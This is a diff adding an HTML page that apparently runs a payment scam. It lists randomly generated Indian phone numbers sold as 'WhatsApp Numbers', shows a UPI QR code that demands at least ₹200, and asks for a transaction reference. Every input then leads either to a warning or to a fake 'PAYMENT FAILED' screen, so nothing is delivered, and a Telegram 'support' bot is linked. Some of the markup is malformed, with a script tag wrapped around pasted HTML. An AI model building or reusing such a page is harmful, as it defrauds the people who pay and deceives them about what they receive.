@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script src=<!-- Floating Customer Support Button -->
+<a href="https://t.me/yourusername" target="_blank" class="support-btn">
+    💬
+</a>
+
+<style>
+.support-btn {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    width: 60px;
+    height: 60px;
+    background: linear-gradient(135deg, #00ffff, #0088cc);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 28px;
+    text-decoration: none;
+    color: white;
+    box-shadow: 0 0 20px #00ffff, 0 0 40px #00ffff;
+    animation: floatBtn 2s ease-in-out infinite;
+    z-index: 999;
+}
+
+@keyframes floatBtn {
+    0%,100% { transform: translateY(0); }
+    50% { transform: translateY(-8px); }
+}
+
+.support-btn:hover {
+    transform: scale(1.1);
+    box-shadow: 0 0 30px #00ffff, 0 0 60px #00ffff;
+}
+</style>"https://cdn.jsdelivr.net/npm/html5-qrcode@2.3.8"></script>
+
+<style>
+body {
+    margin:0;
+    font-family:Arial;
+    color:white;
+    text-align:center;
+}
+
+/* AI background canvas */
+#bgCanvas {
+    position: fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    z-index:-1;
+    background:#000;
+}
+
+/* Screens */
+.screen { display:none; padding:20px; }
+.active { display:block; }
+
+/* Glow */
+.glow {
+    text-shadow:0 0 10px #00ffff,0 0 25px #00ffff;
+}
+
+/* Numbers */
+.number-box {
+    padding:12px;
+    margin:6px;
+    border-radius:12px;
+    background:rgba(0,255,255,0.1);
+    box-shadow:0 0 10px #00ffff;
+    cursor:pointer;
+}
+
+/* Buttons */
+button {
+    width:100%;
+    padding:12px;
+    margin-top:10px;
+    border:none;
+    border-radius:12px;
+    background:linear-gradient(45deg,#00ffff,#00ccff);
+    color:black;
+    font-weight:bold;
+}
+
+/* Input */
+input {
+    width:100%;
+    padding:12px;
+    margin-top:10px;
+    border-radius:10px;
+    border:none;
+}
+
+/* QR */
+#qrImage {
+    width:200px;
+    border-radius:15px;
+    box-shadow:0 0 20px #00ffff;
+}
+
+/* Warning */
+@keyframes glowred {
+    from { box-shadow:0 0 10px red; }
+    to { box-shadow:0 0 30px red; }
+}
+
+.warning {
+    display:none;
+    margin-top:15px;
+    padding:15px;
+    background:#330000;
+    color:#ff4444;
+    border-radius:10px;
+    animation:glowred 1s infinite alternate;
+}
+
+/* Failed screen */
+.failed-screen {
+    background: radial-gradient(circle,#330000,#000);
+}
+
+#qr-reader { margin-top:15px; }
+</style>
+</head>
+
+<body>
+
+<!-- AI Background -->
+<canvas id="bgCanvas"></canvas>
+
+<!-- SCREEN 1 -->
+<div id="screen1" class="screen active">
+<h2 class="glow">👇 WhatsApp Numbers 🔥</h2>
+<div id="numbers"></div>
+</div>
+
+
+</style>
+<div class="wallet-box">
+    <span>💼 WALLET</span>
+    <span class="wallet-amount">₹000</span>
+</div>
+
+<!-- SCREEN 2 -->
+<div id="screen2" class="screen">
+<h2 class="glow">📷 Scanner</h2>
+
+<img src="https://quickchart.io/qr?size=300&text=upi://pay?pa=subhadeepghosh@fam&pn=whatsaapotp&am=200&cu=INR">
+	<p style="
+color:#00ffff;
+text-align:center;
+font-size:16px;
+margin-top:10px;
+font-weight:bold;
+text-shadow:0 0 10px #00ffff, 0 0 20px #00ffff;
+">
+⚠️ MINIMUM PAY ₹200
+</p>
+
+<button onclick="startScanner()">📷 START SCANNER</button>
+
+<div id="qr-reader"></div>
+
+<input type="text" id="utr" placeholder="Enter UTR Number">
+
+<button onclick="checkUTR()">NEXT ➡️</button>
+
+<div id="warningBox" class="warning">
+⚠️ FIRST PAY YOUR PAYMENT IS NOT DONE
+</div>
+
+<button onclick="go(1)">⬅ BACK</button>
+</div>
+
+<!-- SCREEN 3 -->
+<div id="screen3" class="screen failed-screen">
+<h2 style="color:red; text-shadow:0 0 20px red;">❌ PAYMENT FAILED</h2>
+<p style="color:#ff6666;">FIRST PAY YOUR PAYMENT IS NOT DONE</p>
+<button onclick="go(1)">HOME</button>
+</div>
+
+<script>
+
+// NAV
+function go(n){
+document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
+document.getElementById('screen'+n).classList.add('active');
+window.scrollTo(0,0);
+}
+
+// NUMBERS
+function gen(){
+let box=document.getElementById('numbers');
+
+for(let i=0;i<100;i++){
+let first=Math.floor(Math.random()*4)+6;
+let rest="";
+for(let j=0;j<9;j++){ rest+=Math.floor(Math.random()*10); }
+
+let num="+91 "+first+rest;
+
+let d=document.createElement("div");
+d.className="number-box";
+d.innerText=num;
+
+// click → scanner
+d.onclick=function(){ go(2); };
+
+box.appendChild(d);
+}
+}
+gen();
+
+// SCANNER
+let scanner;
+function startScanner(){
+scanner=new Html5Qrcode("qr-reader");
+
+scanner.start(
+{ facingMode:"environment"},
+{ fps:10, qrbox:250},
+()=>{
+alert("Scanned ✅");
+scanner.stop();
+});
+}
+
+// UTR CHECK
+function checkUTR(){
+let utr=document.getElementById("utr").value;
+
+if(utr.length<5){
+document.getElementById("warningBox").style.display="block";
+}else{
+document.getElementById("warningBox").style.display="none";
+go(3);
+}
+}
+
+// AI BACKGROUND
+const canvas=document.getElementById("bgCanvas");
+const ctx=canvas.getContext("2d");
+
+canvas.width=window.innerWidth;
+canvas.height=window.innerHeight;
+
+let particles=[];
+
+for(let i=0;i<80;i++){
+particles.push({
+x:Math.random()*canvas.width,
+y:Math.random()*canvas.height,
+vx:Math.random()*1-0.5,
+vy:Math.random()*1-0.5
+});
+}
+
+function animate(){
+ctx.clearRect(0,0,canvas.width,canvas.height);
+
+for(let p of particles){
+p.x+=p.vx;
+p.y+=p.vy;
+
+if(p.x<0||p.x>canvas.width) p.vx*=-1;
+if(p.y<0||p.y>canvas.height) p.vy*=-1;
+
+ctx.beginPath();
+ctx.arc(p.x,p.y,2,0,Math.PI*2);
+ctx.fillStyle="#00ffff";
+ctx.fill();
+}
+
+for(let i=0;i<particles.length;i++){
+for(let j=i+1;j<particles.length;j++){
+let dx=particles[i].x-particles[j].x;
+let dy=particles[i].y-particles[j].y;
+let dist=Math.sqrt(dx*dx+dy*dy);
+
+if(dist<120){
+ctx.beginPath();
+ctx.moveTo(particles[i].x,particles[i].y);
+ctx.lineTo(particles[j].x,particles[j].y);
+ctx.strokeStyle="rgba(0,255,255,0.2)";
+ctx.stroke();
+}
+}
+}
+
+requestAnimationFrame(animate);
+}
+
+animate();
+
+window.onresize=()=>{
+canvas.width=window.innerWidth;
+canvas.height=window.innerHeight;
+};
+
+</script>
+<!-- Floating Customer Support Button -->
+<a href="https://t.me/Whatsaappremiumbotnumber_bot" target="_blank" class="support-btn">
+    💬
+</a>
+
+<style>
+.support-btn {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    width: 60px;
+    height: 60px;
+    background: linear-gradient(135deg, #00ffff, #0088cc);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 28px;
+    text-decoration: none;
+    color: white;
+    box-shadow: 0 0 20px #00ffff, 0 0 40px #00ffff;
+    animation: floatBtn 2s ease-in-out infinite;
+    z-index: 999;
+}
+
+@keyframes floatBtn {
+    0%,100% { transform: translateY(0); }
+    50% { transform: translateY(-8px); }
+}
+
+.support-btn:hover {
+    transform: scale(1.1);
+    box-shadow: 0 0 30px #00ffff, 0 0 60px #00ffff;
+}
+</style>
+</body>
+</html>
